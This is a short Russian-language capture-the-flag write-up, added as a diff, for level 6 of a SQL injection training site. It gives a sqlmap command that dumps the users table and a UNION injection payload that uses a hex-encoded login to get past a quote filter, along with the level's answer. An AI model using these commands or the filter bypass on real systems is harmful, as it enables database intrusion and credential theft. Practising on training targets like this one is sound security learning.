@@ -1,0 +1,27 @@
+https://sql.training.hackerdom.ru/6skldj.php
+--------------------------------------------
+
+Таблицы: users
+Поля: id, login, pass
+Запрос: SELECT * FROM users WHERE id=$text LIMIT 1
+Подсказка: база пользователей стала дли-и-и-инная
+
+Теперь всегда выводится только первая строка ответа (вне зависимости от того, сколько вернул SQL-запрос)
+Фильтруются кавычки (' и ")
+
+sqlmap:
+sqlmap -u "https://sql.training.hackerdom.ru/6skldj.php?text=1" -D sql_level6 -T users --dump --batch 
+
+и сразу видим ответ: ivarywantlevel7
+
+но можно и по другому
+
+так как выводится только одна строчка, нужно сделать так что бы первая строка не выводилась, а только что нам нужно => id=-1
+
+воспользуемся union запросом, и получаем
+
+-1 union select id,login,pass from users where login=0x676f64 -- -
+
+в место логина - его hex-значение, так как просто 'god' не пропускает
+
+ответ: ivarywantlevel7
